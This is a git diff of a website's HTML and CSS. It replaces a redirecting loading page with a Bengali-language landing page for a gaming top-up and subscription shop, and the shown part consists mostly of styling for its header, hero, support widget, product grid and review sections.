@@ -1,22 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your TopUp Center | Trusted Digital Top-Ups & Online Services</title>
-    <meta http-equiv="refresh" content="2;url=https://yourtopupcenter.github.io/home">
+    <title>Your TopUp Center - দ্রুত ও নির্ভরযোগ্য টপ-আপ</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     
-     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Get top-ups for Free Fire, PUBG, COC, Teen Patti, and OTT subscriptions. Your TopUp Center provides fast, secure, and affordable digital services for all your online needs.">
-    <meta name="keywords" content="Your TopUp Center, #ytc24, top-up services, Free Fire TopUp, PUBG, COC, OTT subscriptions, gaming recharges">
-    <meta name="author" content="Ali Hosen">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="application-name" content="Your TopUp Center">
-    <meta property="og:title" content="Your TopUp Center - Trusted Digital Services">
-    <meta property="og:image" content="https://i.postimg.cc/Qx3wdSvM/Adobe-Express-20231213-2151070-1.png">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <link rel="canonical" href="https://yourwebsite.com/home" />
-    <!-- Google tag (gtag.js) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Mina:wght@400;700&display=swap" rel="stylesheet">
+
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-K5L2N4FDN4"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -26,206 +20,2325 @@
   gtag('config', 'G-K5L2N4FDN4');
     </script>
     
-    <link rel="icon" href="https://i.postimg.cc/mD3qYHH4/Picsart-24-01-20-22-35-57-863.png" type="image/png">
     <style>
-      
-        body, html {
+        /* --- Global Styles & Variables --- */
+        :root {
+            --primary-color: #006eff; /* একটু উজ্জ্বল নীল */
+            --secondary-color: #5a6a7e; /* মাঝারি ধূসর */
+            --success-color: #20c997; /* উজ্জ্বল সবুজ */
+            --danger-color: #dc3545; /* লাল */
+            --warning-color: #ffc107; /* হলুদ */
+            --info-color: #17a2b8; /* হালকা নীল */
+            --light-color: #f8f9fa; /* হালকা ধূসর */
+            --dark-color: #212529; /* গাঢ় কালো */
+            --white-color: #ffffff;
+            --body-font: 'Mina', sans-serif;
+            --heading-font: 'Mina', sans-serif;
+            --transition-speed: 0.3s ease;
+            --border-radius: 8px;
+            --box-shadow-light: 0 4px 15px rgba(0, 0, 0, 0.06);
+            --box-shadow-medium: 0 6px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
             margin: 0;
             padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #0d0d0d;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Roboto', sans-serif;
+            box-sizing: border-box;
         }
 
-        .loading-container {
+        html {
+            scroll-behavior: smooth;
+            overflow-x: hidden; /* Prevent horizontal scroll */
+        }
+
+        body {
+            font-family: var(--body-font);
+            line-height: 1.7; /* Increased for better readability */
+            color: var(--dark-color);
+            background-color: var(--white-color);
+            overflow-x: hidden; /* Prevent horizontal scroll */
+        }
+
+        h1, h2, h3, h4, h5, h6 {
+            font-family: var(--heading-font);
+            font-weight: 700; /* Bolder headings */
+            margin-bottom: 1rem;
+            color: #2c3e50; /* গাঢ় নেভি ব্লু */
+            line-height: 1.3;
+        }
+
+        a {
+            text-decoration: none;
+            color: var(--primary-color);
+            transition: color var(--transition-speed);
+        }
+
+        a:hover {
+            color: #004bbd; /* গাঢ় নীল */
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px; /* Reduced padding for smaller gaps on edges */
+        }
+
+        section {
+            padding: 70px 0;
+            position: relative; /* For potential pseudo-elements */
+            overflow: hidden; /* Prevent section content overflow */
+        }
+        /* Alternating Backgrounds */
+        section:nth-of-type(odd):not(#hero):not(#notice) {
+            background-color: #fdfdfd;
+        }
+        section:nth-of-type(even):not(#notice):not(#social-media):not(#payment-methods) {
+            background-color: #f7faff; /* Very light blue */
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 50px;
+            font-size: 2.4rem;
+            font-weight: 700;
+            color: #333;
             position: relative;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            padding-bottom: 20px;
         }
 
-        .loader {
-            position: relative;
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(45deg, #00ffff, #00ff88);
-            border-radius: 50%;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.6), 0 0 60px rgba(0, 255, 255, 0.4), inset 0 0 30px rgba(0, 255, 255, 0.3);
-            animation: rotate 2s linear infinite, glow 1.5s ease-in-out infinite alternate;
+        .section-title i {
+            color: var(--primary-color);
+            margin-right: 10px;
+            font-size: 2rem; /* Slightly smaller icon */
+            vertical-align: middle;
         }
 
-        .loader:before, .loader:after {
-            content: "";
+        .section-title::after {
+            content: '';
             position: absolute;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #00ff88, #00ffff);
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.6), 0 0 60px rgba(0, 255, 255, 0.4);
+            display: block;
+            width: 80px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary-color), var(--info-color)); /* Gradient line */
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 2px;
         }
 
-        .loader:before {
+        .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background-image: linear-gradient(45deg, var(--primary-color) 0%, #007bff 100%); /* Gradient button */
+            color: var(--white-color);
+            border: none;
+            border-radius: 50px; /* Pill shape */
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition-speed);
+            box-shadow: 0 5px 15px rgba(0, 110, 255, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn:hover {
+            background-image: linear-gradient(45deg, #0056b3 0%, var(--primary-color) 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 110, 255, 0.4);
+        }
+         .btn i {
+             margin-left: 8px;
+         }
+
+
+        /* --- Header Styles --- */
+        #main-header {
+            background-color: rgba(255, 255, 255, 0.97); /* Slightly less transparent */
+            backdrop-filter: blur(8px); /* Frosted glass effect */
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
+            padding: 12px 0; /* Slightly reduced padding */
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            transition: background-color var(--transition-speed), padding var(--transition-speed);
+        }
+
+        /* Add subtle shadow on scroll */
+        body.scrolled #main-header {
+             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+             /* padding: 10px 0; */ /* Optional: shrink header */
+        }
+
+        #main-header .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo a {
+            font-size: 1.9rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            transition: transform var(--transition-speed);
+        }
+         .logo a:hover {
+            transform: scale(1.03);
+         }
+         .logo a i {
+            margin-right: 10px;
+            color: var(--success-color);
+            font-size: 1.5rem; /* Adjusted icon size */
+             animation: rotateIcon 5s linear infinite;
+         }
+
+        #main-nav ul {
+            display: flex;
+        }
+
+        #main-nav ul li {
+            margin-left: 30px; /* Increased spacing */
+        }
+
+        #main-nav ul li a {
+            color: var(--dark-color);
+            font-weight: 600; /* Slightly bolder nav links */
+            padding: 8px 0;
+            position: relative;
+            transition: color var(--transition-speed);
+            letter-spacing: 0.3px;
+        }
+
+        #main-nav ul li a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 3px; /* Thicker underline */
+            display: block;
+            margin-top: 6px;
+            right: 0;
+            background: var(--primary-color);
+            transition: width 0.4s ease-out, left 0.4s ease-out; /* Smoother animation */
+            border-radius: 2px;
+        }
+
+        #main-nav ul li a:hover {
+            color: var(--primary-color);
+        }
+
+        #main-nav ul li a:hover::after {
+            width: 100%;
+            left: 0;
+            background-color: var(--primary-color);
+        }
+
+        /* Mobile Menu */
+        .menu-toggle {
+            display: none;
+            font-size: 1.8rem; /* Larger toggle icon */
+            cursor: pointer;
+            color: var(--dark-color);
+            transition: color var(--transition-speed);
+        }
+        .menu-toggle:hover {
+             color: var(--primary-color);
+        }
+
+        /* --- Hero Section --- */
+        #hero {
+             background: linear-gradient(135deg, rgba(0, 110, 255, 0.85), rgba(0, 60, 150, 0.9)), url('https://img.freepik.com/free-photo/hex-textured-background-networking_23-2150080759.jpg?t=st=1744458406~exp=1744462006~hmac=acc020910c18b1035c7e32b6cbd1cce71e4ecd3b4ca630a43d401a6f20108e7e&w=826') no-repeat center center/cover;
+            color: var(--white-color);
+            height: 95vh; /* Slightly taller */
+            min-height: 600px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            padding-top: 80px; /* Header height consideration */
+            clip-path: polygon(0 0, 100% 0, 100% 90%, 0 100%); /* Angled bottom */
+        }
+
+#hero .container p{
+    
+    text-align: center;
+    margin-left: 5%;
+}
+        #hero h1 {
+            font-size: 3.8rem;
+            margin-bottom: 25px;
+            color: var(--white-color);
+            font-weight: 700;
+            text-shadow: 2px 2px 6px rgba(0, 0, 0, 0.4);
+            animation: fadeInUp 1s ease-out;
+        }
+
+
+
+
+
+   .support-widget {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 1010; /* Ensure above other elements */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .support-main-btn {
+            width: 65px;
+            height: 65px;
+            background-image: linear-gradient(135deg, var(--primary-color) 0%, var(--info-color) 100%);
+            color: var(--white-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.9rem;
+            cursor: pointer;
+            box-shadow: 0 6px 18px rgba(0, 110, 255, 0.4);
+            transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55), box-shadow var(--transition-speed); /* Added cubic-bezier for bounce */
+            z-index: 1011;
+            border: 3px solid var(--white-color); /* White border */
+            position: relative; /* Needed for icon transition */
+            overflow: hidden; /* Clip icons during transition */
+            animation: pulse 2.5s infinite ease-in-out; /* Subtle pulse */
+        }
+        .support-main-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 10px 25px rgba(0, 110, 255, 0.5);
+            animation-play-state: paused; /* Pause pulse on hover */
+        }
+        .support-main-btn i { /* Icon transition */
+            position: absolute;
+            transition: transform 0.4s ease-out, opacity 0.3s ease-out;
+        }
+        .support-main-btn .fa-headset {
+            transform: rotate(0deg) scale(1);
+            opacity: 1;
+        }
+        .support-main-btn .fa-times {
+            transform: rotate(-90deg) scale(0.8);
+            opacity: 0;
+        }
+        .support-main-btn.active .fa-headset {
+            transform: rotate(90deg) scale(0.8);
+            opacity: 0;
+        }
+        .support-main-btn.active .fa-times {
+            transform: rotate(0deg) scale(1);
+            opacity: 1;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 6px 18px rgba(0, 110, 255, 0.4), 0 0 0 0 rgba(0, 110, 255, 0.4); }
+            70% { box-shadow: 0 6px 18px rgba(0, 110, 255, 0.4), 0 0 0 10px rgba(0, 110, 255, 0); }
+            100% { box-shadow: 0 6px 18px rgba(0, 110, 255, 0.4), 0 0 0 0 rgba(0, 110, 255, 0); }
+        }
+
+        .support-options {
+            position: absolute; /* Position relative to main button */
+            bottom: 80px; /* Start position above the main button */
+            right: 7.5px; /* Center options relative to main button width (65/2 - 50/2) */
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+            /* Initial hidden state */
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease-out, visibility 0.3s ease-out;
+            pointer-events: none; /* Prevent clicks when hidden */
+        }
+
+        .support-options.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+        }
+        .support-options.active .support-option {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+            visibility: visible;
+        }
+
+        .support-option {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.5rem;
+            color: var(--white-color);
+            box-shadow: var(--box-shadow-medium);
+            text-decoration: none;
+            position: relative; /* Needed for tooltip */
+             /* Initial state for staggered animation */
+            opacity: 0;
+            transform: translateY(15px) scale(0.8);
+            visibility: hidden;
+            transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55), opacity 0.3s ease-out, visibility 0.3s ease-out, box-shadow var(--transition-speed), background-color var(--transition-speed);
+        }
+
+        /* Staggered Animation Delays */
+        .support-options.active .support-option:nth-child(1) { transition-delay: 0.25s; }
+        .support-options.active .support-option:nth-child(2) { transition-delay: 0.2s; }
+        .support-options.active .support-option:nth-child(3) { transition-delay: 0.15s; }
+        .support-options.active .support-option:nth-child(4) { transition-delay: 0.1s; }
+
+        .support-option:hover {
+            transform: scale(1.18) rotate(5deg); /* Enhanced hover */
+            box-shadow: 0 8px 22px rgba(0, 0, 0, 0.25);
+        }
+
+        /* Tooltip Styles */
+        .support-option::before {
+            content: attr(data-tooltip);
+            position: absolute;
+            right: 110%; /* Position to the left */
+            top: 50%;
+            transform: translateY(-50%) scale(0.8); /* Start slightly smaller */
+            background-color: rgba(44, 62, 80, 0.9); /* Dark background */
+            color: var(--white-color);
+            padding: 5px 12px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity var(--transition-speed), transform var(--transition-speed);
+            pointer-events: none;
+        }
+        .support-option:hover::before {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(-50%) scale(1); /* Scale up */
+        }
+
+        /* Specific colors for support options */
+        .support-option.whatsapp { background-color: #25D366; }
+        .support-option.messenger { background-color: #0084FF; }
+        .support-option.call { background-color: var(--danger-color); }
+        .support-option.telegram { background-color: #2AABEE; }
+
+        /* --- Fixed Ad Banner Styles (Advanced) --- */
+        .fixed-ad-banner {
+            position: fixed;
+            bottom: 25px;
+            left: -400px; /* Start off-screen */
+            background: linear-gradient(135deg, rgba(44, 62, 80, 0.92), rgba(52, 73, 94, 0.95)); /* Darker gradient */
+            backdrop-filter: blur(6px);
+            color: var(--white-color);
+            padding: 12px 45px 12px 20px; /* More padding */
+            border-radius: 0 var(--border-radius) var(--border-radius) 0; /* Rounded right corners */
+            box-shadow: var(--box-shadow-medium);
+            z-index: 999;
+            max-width: 320px;
+            font-size: 0.9rem;
+            opacity: 1;
+             /* Animation */
+            animation: slideInAd 0.8s cubic-bezier(0.25, 0.8, 0.25, 1) 1.5s forwards; /* Slide in after 1.5s delay */
+            transition: opacity 0.5s ease, transform 0.5s ease; /* Smooth slide out */
+        }
+        /* Hidden state */
+        .fixed-ad-banner.hidden {
+             opacity: 0;
+             transform: translateX(-110%); /* Slide fully out */
+             pointer-events: none;
+        }
+
+        @keyframes slideInAd {
+            from { left: -400px; }
+            to { left: 0; } /* Slide in to position */
+        }
+
+        .ad-content {
+            display: flex; /* Use flex for icon and text */
+            align-items: center;
+            gap: 10px;
+            line-height: 1.5;
+        }
+        .ad-content i { /* Ad icon */
+            font-size: 1.5rem;
+            color: var(--warning-color);
+            flex-shrink: 0; /* Prevent icon from shrinking */
+        }
+        .ad-content a { color: var(--warning-color); font-weight: 600; text-decoration: underline; }
+        .ad-close-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 1.3rem; /* Larger close icon */
+            cursor: pointer;
+            padding: 5px;
+            line-height: 1;
+            transition: color var(--transition-speed), transform var(--transition-speed);
+        }
+        .ad-close-btn:hover {
+            color: var(--white-color);
+            transform: rotate(90deg);
+        }
+
+        /* --- Responsive Adjustments --- */
+        @media (max-width: 768px) {
+            .support-widget { bottom: 15px; right: 15px; }
+            .support-main-btn { width: 60px; height: 60px; font-size: 1.7rem; }
+            .support-option { width: 45px; height: 45px; font-size: 1.4rem; }
+            .support-options { bottom: 75px; right: 7.5px; gap: 12px; }
+            .support-option::before { display: none; } /* Hide tooltips on smaller screens */
+
+            .fixed-ad-banner { left: -400px; bottom: 15px; padding: 10px 40px 10px 15px; font-size: 0.85rem; max-width: 280px;}
+            .ad-close-btn { font-size: 1.1rem; top: 4px; right: 4px;}
+
+      
+        }
+        @media (max-width: 480px) {
+             .support-widget { bottom: 10px; right: 10px; }
+             .support-main-btn { width: 55px; height: 55px; font-size: 1.6rem; }
+             .support-option { width: 40px; height: 40px; font-size: 1.3rem; }
+             .support-options { bottom: 70px; right: 7.5px; gap: 10px; }
+
+             .fixed-ad-banner { left: -400px; bottom: 10px; max-width: calc(100vw - 20px); border-radius: var(--border-radius); /* Standard radius on small screens */ }
+        }
+
+        /* --- Animations (Keep from previous) --- */
+        @keyframes rotateIcon { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .fade-inX { opacity: 0; transform: translateY(30px); transition: opacity 0.7s ease-out, transform 0.7s ease-out; }
+        .fade-in.visible { opacity: 1; transform: translateY(0); }
+        @keyframes fadeInDownX { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeInUpX { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }    
+
+
+
+
+
+        #hero p {
+            font-size: 1.4rem;
+            margin-bottom: 35px;
+            max-width: 650px;
+            line-height: 1.8;
+             animation: fadeInUp 1s ease-out 0.2s;
+             animation-fill-mode: backwards;
+        }
+
+        #hero .btn {
+            font-size: 1.2rem;
+            padding: 16px 40px;
+            animation: pulse 2s infinite ease-in-out 1.2s;
+        }
+
+        .scroll-down {
+            position: absolute;
+            bottom: 50px; /* Adjusted position due to clip-path */
+            left: 50%;
+            transform: translateX(-50%);
+            animation: bounce 2.5s infinite; /* Slower bounce */
+            z-index: 5;
+        }
+
+        .scroll-down i {
+            font-size: 2.2rem;
+            color: rgba(255, 255, 255, 0.8);
+            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.3);
+             transition: color var(--transition-speed);
+        }
+        .scroll-down a:hover i {
+             color: var(--white-color);
+        }
+
+        /* --- Image Slider --- */
+        #image-slider {
+            /* background-color: var(--light-color); */ /* Use alternating bg */
+        }
+        .slider-container {
+            width: 100%;
+            max-width: 1100px; /* Wider slider */
+            margin: 0 auto;
+            overflow: hidden;
+            position: relative;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow-medium);
+        }
+        .slider-wrapper {
+            display: flex;
+            transition: transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55); /* Smooth transition */
+        }
+        .slide {
+            min-width: 100%;
+            box-sizing: border-box;
+        }
+        .slide img {
+            width: 100%;
+            height: 450px; /* Taller images */
+            object-fit: cover;
+            display: block;
+            border-radius: var(--border-radius);
+        }
+        .slider-nav {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 25px;
+            z-index: 10;
+        }
+        .slider-nav button {
+            background-color: rgba(0, 0, 0, 0.4);
+            color: white;
+            border: none;
+            padding: 12px 18px; /* Larger buttons */
+            font-size: 1.8rem;
+            cursor: pointer;
+            border-radius: 50%;
+            transition: background-color var(--transition-speed), transform var(--transition-speed);
+        }
+        .slider-nav button:hover {
+            background-color: rgba(0, 0, 0, 0.7);
+            transform: scale(1.1);
+        }
+        .slider-dots {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+        }
+        .dot {
+            height: 12px;
+            width: 12px;
+            margin: 0 6px;
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            display: inline-block;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+        .dot.active {
+            background-color: var(--primary-color);
+            transform: scale(1.2);
+        }
+
+
+        /* --- Notice Section --- */
+        #notice {
+            background-color: var(--dark-color); /* Darker notice */
+            color: var(--white-color);
+            padding: 15px 0;
+            font-weight: 500;
+            overflow: hidden; /* Crucial for containing marquee */
+        }
+        #notice .container {
+             max-width: 100%; /* Allow full width */
+             padding: 0;
+        }
+        .marquee-wrapper {
+             width: 100%;
+             overflow: hidden;
+             display: block; /* Ensure it takes full width */
+        }
+        #notice p {
+            margin: 0;
+            display: inline-block; /* Important for marquee */
+            padding-left: 100%; /* Start off-screen */
+            white-space: nowrap;
+            animation: marquee 25s linear infinite;
+            color: var(--warning-color); /* Yellow text for contrast */
+        }
+        #notice p i {
+             margin-right: 10px;
+             color: var(--warning-color);
+        }
+
+        /* --- Products Section --- */
+        #products {
+           /* background-color: #fdfdfd; */ /* Alternating bg */
+        }
+        .filter-buttons {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .filter-buttons button {
+            background-color: var(--white-color);
+            color: var(--dark-color);
+            border: 1px solid #ddd;
+            padding: 10px 25px; /* Increased padding */
+            margin: 5px 8px; /* Spacing for wrapping */
+            border-radius: 50px; /* Pill shape */
+            cursor: pointer;
+            transition: all var(--transition-speed);
+            font-weight: 500;
+            box-shadow: var(--box-shadow-light);
+        }
+        .filter-buttons button:hover {
+            background-color: #e9ecef; /* Light hover */
+            border-color: #ccc;
+            transform: translateY(-2px);
+        }
+        .filter-buttons button.active {
+            background-color: var(--primary-color);
+            color: var(--white-color);
+            border-color: var(--primary-color);
+            box-shadow: 0 4px 10px rgba(0, 110, 255, 0.3);
+            transform: translateY(-2px);
+        }
+         .filter-buttons button i {
+             margin-right: 5px;
+         }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(270px, 1fr)); /* Slightly wider cards */
+            gap: 35px; /* Increased gap */
+        }
+        .product-item {
+            background-color: var(--white-color);
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--box-shadow-light);
+            transition: transform var(--transition-speed), box-shadow var(--transition-speed);
+            display: flex;
+            flex-direction: column;
+            opacity: 0; /* Start hidden for filter animation */
+             transform: scale(0.95);
+             transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+        .product-item.show {
+             opacity: 1;
+             transform: scale(1);
+        }
+         .product-item.hide {
+             opacity: 0;
+             transform: scale(0.95);
+             /* We need JS to set display: none after transition or manage visibility */
+             /* Simple approach: let opacity handle visibility */
+             pointer-events: none; /* Prevent interaction when hidden */
+             height: 0; /* Collapse space - might need adjustment */
+             margin: 0;
+             padding: 0;
+             border: none;
+             overflow: hidden;
+             /* display: none; /* Simpler, but less transition */
+        }
+
+        .product-item:hover {
+            transform: translateY(-8px) scale(1.02); /* Enhanced hover */
+            box-shadow: var(--box-shadow-medium);
+        }
+        .product-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-bottom: 1px solid #eee;
+        }
+        .product-content {
+            padding: 25px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .product-content h3 {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            color: var(--dark-color);
+        }
+        .product-content p {
+            color: var(--secondary-color);
+            margin-bottom: 15px;
+            flex-grow: 1; /* Push button to bottom */
+            font-size: 0.95rem;
+        }
+        .product-content .price {
+            font-size: 1.2rem;
+            font-weight: 700; /* Bolder price */
+            color: var(--success-color);
+            margin-bottom: 20px;
+        }
+        .product-item .btn {
+            width: 100%;
+            text-align: center;
+            padding: 12px;
+            font-size: 0.95rem;
+        }
+
+        /* --- Early Access Section --- */
+        #early-access {
+            background-color: var(--info-color);
+            color: var(--white-color);
+            clip-path: polygon(0 10%, 100% 0, 100% 90%, 0 100%); /* Double angle */
+            padding: 100px 0; /* Adjust padding for clip-path */
+            margin-top: -50px; /* Overlap slightly */
+            margin-bottom: -50px;
+            z-index: 1;
+        }
+        #early-access .section-title {
+            color: var(--white-color);
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
+        }
+         #early-access .section-title::after{
+            background: var(--white-color);
+         }
+        .early-access-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            text-align: center;
+        }
+        .early-access-item {
+            background: rgba(255, 255, 255, 0.15); /* Slightly more visible */
+            padding: 30px 25px;
+            border-radius: var(--border-radius);
+            transition: background var(--transition-speed), transform var(--transition-speed);
+            backdrop-filter: blur(5px);
+        }
+        .early-access-item:hover {
+             background: rgba(255, 255, 255, 0.25);
+             transform: translateY(-5px);
+        }
+        .early-access-item i {
+            font-size: 2.5rem; /* Larger icons */
+            margin-bottom: 20px;
+            color: var(--warning-color);
+            display: block; /* Ensure block display */
+        }
+        .early-access-item h3 {
+             color: var(--white-color);
+             font-size: 1.4rem;
+             font-weight: 600;
+             margin-bottom: 10px;
+        }
+        .early-access-item p {
+            font-size: 1rem;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+
+        /* --- Why Buy Us Section --- */
+        #why-us {
+            /* background-color: var(--light-color); */ /* Alternating bg */
+             padding-top: 100px; /* More space after angled section */
+        }
+        .why-us-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 35px; /* Increased gap */
+            text-align: center;
+        }
+         .why-us-item {
+             background-color: var(--white-color);
+             padding: 35px 25px;
+             border-radius: var(--border-radius);
+             box-shadow: var(--box-shadow-light);
+             transition: transform var(--transition-speed), box-shadow var(--transition-speed);
+         }
+         .why-us-item:hover {
+             transform: translateY(-8px);
+             box-shadow: var(--box-shadow-medium);
+         }
+        .why-us-item i {
+            font-size: 3.5rem; /* Larger icons */
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            transition: transform var(--transition-speed);
+            display: inline-block; /* Allow transform */
+        }
+         .why-us-item:hover i {
+            transform: scale(1.1) rotate(5deg);
+         }
+        .why-us-item h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        .why-us-item p {
+            color: var(--secondary-color);
+            font-size: 0.95rem;
+        }
+
+
+        /* --- Video Section --- */
+        #video {
+             /* background-color: #f1f3f5; */ /* Alternating bg */
+        }
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            height: 0;
+            overflow: hidden;
+            max-width: 1000px; /* Max width for video */
+            margin: 0 auto; /* Center */
+            background: #000;
+            border-radius: var(--border-radius);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2); /* Stronger shadow */
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            top: -15px;
-            left: -15px;
-            filter: blur(15px);
-            animation: rotate-reverse 2s linear infinite;
+            border: 0;
         }
 
-        .loader:after {
-            width: 60%;
-            height: 60%;
-            top: 20%;
-            left: 20%;
-            filter: blur(10px);
-            animation: rotate 2s linear infinite reverse;
+        /* --- Blogs Section --- */
+        .blog-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); /* Slightly larger cards */
+            gap: 35px;
+        }
+        .blog-post {
+            background: var(--white-color);
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--box-shadow-light);
+            transition: transform var(--transition-speed), box-shadow var(--transition-speed);
+        }
+         .blog-post:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--box-shadow-medium);
+        }
+        .blog-post img {
+            width: 100%;
+            height: 220px; /* Taller image */
+            object-fit: cover;
+            transition: transform 0.4s ease;
+        }
+         .blog-post:hover img {
+            transform: scale(1.05);
+         }
+        .blog-content {
+            padding: 30px;
+        }
+        .blog-content h3 {
+            font-size: 1.4rem; /* Larger heading */
+            margin-bottom: 15px;
+             color: var(--dark-color);
+        }
+        .blog-meta {
+            font-size: 0.9rem; /* Slightly larger meta */
+            color: var(--secondary-color);
+            margin-bottom: 15px;
+        }
+        .blog-meta span {
+            margin-right: 20px;
+        }
+        .blog-meta i {
+            margin-right: 6px;
+            color: var(--primary-color); /* Icon color */
+        }
+        .blog-content p {
+            color: var(--dark-color);
+            margin-bottom: 25px;
+            line-height: 1.8;
+            font-size: 0.95rem;
+        }
+        .read-more {
+            font-weight: 700; /* Bolder read more */
+            color: var(--primary-color);
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            letter-spacing: 0.5px;
+        }
+         .read-more i {
+             margin-left: 8px;
+             transition: margin-left var(--transition-speed);
+         }
+         .read-more:hover {
+             color: #004bbd;
+         }
+         .read-more:hover i {
+             margin-left: 12px;
+         }
+
+
+        /* --- Review Section --- */
+        #reviews {
+            /* background-color: var(--light-color); */ /* Alternating bg */
+        }
+        .review-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 35px;
+        }
+        .review-card {
+            background: var(--white-color);
+            padding: 35px 30px 30px 30px; /* More top padding */
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow-light);
+            border-left: 6px solid var(--primary-color); /* Thicker border */
+            position: relative;
+            transition: transform var(--transition-speed), box-shadow var(--transition-speed);
+        }
+         .review-card:hover {
+             transform: translateY(-5px);
+             box-shadow: var(--box-shadow-medium);
+         }
+         .review-card::before { /* Quote icon */
+            content: "\f10d"; /* Font Awesome quote-left */
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+            position: absolute;
+            top: 20px;
+            left: -15px; /* Position over the border */
+            font-size: 3.5rem;
+            color: rgba(0, 110, 255, 0.1); /* Lighter quote */
